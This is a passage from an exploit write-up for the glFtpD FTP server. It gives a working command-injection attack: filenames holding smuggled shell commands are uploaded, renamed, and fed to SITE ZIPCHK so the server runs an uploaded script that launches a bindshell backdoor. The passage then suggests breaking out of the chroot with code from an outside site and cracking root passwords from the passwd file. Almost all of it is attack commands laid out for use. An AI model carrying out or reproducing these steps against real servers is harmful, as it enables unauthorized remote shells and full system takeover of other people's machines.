Exploit Information:

	1) & 2) are traditionally bad. Problems are obvious. 

	3) This is quite simple a user need only have some place to upload files:

		- You will need to build some kind of backdoor to allow you access, using bindshell.c (again)

		$ gcc bindshell.c -o b -static
	
		- Create an empty file called " ; bash blah;"
		- Create an empty file called " ; unzip blah;"

		$ > " ; bash blah;"		

		- Create a script called "blah" : 

		$ cat > blah
		#!/bin/bash
		./b &
		^D

		- "ZIP" these files up. 
		
		$ zip blah.zip blah b

		- Login to your FTP server. Now upload your files:

		ftp> put blah.zip
		ftp> put " ; bash blah;"
		ftp> put " ; unzip blah.zip;"

		- Because glFtpD attempts to convert spaces in filenames to underscores, youll need to rename
		  them back.
	
		ftp> quote rnfr "_;_bash_blah;"
		ftp> quote rnto " ; bash blah;"
		ftp> quote rnfr "_;_unzip_blah.zip;"
		ftp> quote rnto " ; unzip blah.zip;"

		- Now run a ZIPCHK on the unzip one:

		ftp> quote SITE ZIPCHK " ; unzip blah.zip;"
		
		- Hurray, now do a few ls commands till you get a file listing. Now run:

		ftp> quote SITE ZIPCHK " ; bash blah;"

		- glFtpD will spit out an error message. Ignore it. Now telnet to the port defined within
		  bindshell.c.

		- Once your on. If you attacked the glftpd account (or any uid = 0 account), you may now use simple chroot()
		  breaking techniques (http://www.suid.kg/source/breakchroot.c) to have run of the entire box.

		- If you did not have a uid == 0 account. Youll probably be in a chroot environment and you 
		  dont really have a way out except to:

			- check /etc/passwd (really $GLFTPDHOME/etc/passwd)
			- Crack a uid == 0 passwd, maybe the glftpd account is still in there
			- Use your imagination.
